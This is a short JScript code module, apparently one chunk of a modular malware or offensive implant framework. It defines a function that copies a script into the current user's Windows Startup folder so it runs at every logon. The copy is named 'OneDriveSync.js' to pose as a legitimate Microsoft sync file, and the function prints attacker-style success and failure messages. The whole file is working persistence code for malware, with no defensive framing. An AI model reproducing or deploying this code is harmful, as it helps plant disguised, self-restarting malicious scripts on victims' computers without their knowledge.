// chunk: persist/startup_folder
// depends: core/run_cmd, core/file_ops
// provides: persist_startup
// format: jscript

function persist_startup(scriptPath) {
    var startupDir = _s.ExpandEnvironmentStrings("%APPDATA%") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
    var lnkName = "OneDriveSync.js";
    var dst = startupDir + "\\" + lnkName;
    try {
        _fso.CopyFile(scriptPath, dst, true);
        emit("  [+] Startup folder persistence: " + dst + "\r\n");
    } catch(e) {
        emit("  [-] Startup folder copy failed: " + e.message + "\r\n");
    }
    return dst;
}
